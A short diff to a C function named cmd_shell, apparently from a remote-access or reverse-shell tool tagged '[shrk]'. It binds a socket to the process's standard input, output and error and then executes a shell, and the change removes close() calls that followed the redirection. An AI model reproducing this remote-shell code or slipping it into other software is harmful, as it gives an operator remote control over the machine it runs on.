@@ -66,10 +66,6 @@ char *cmd_shell(job_t *job) {
     dup2(s, fileno(stderr));
     dup2(s, fileno(stdin));
 
-    close(fileno(stdout));
-    close(fileno(stderr));
-    close(fileno(stdin));
-
     // execute da shell we found
     printf("[shrk] connection was successful, executing %s\n", shell);
     char *const argv[] = {shell, NULL};
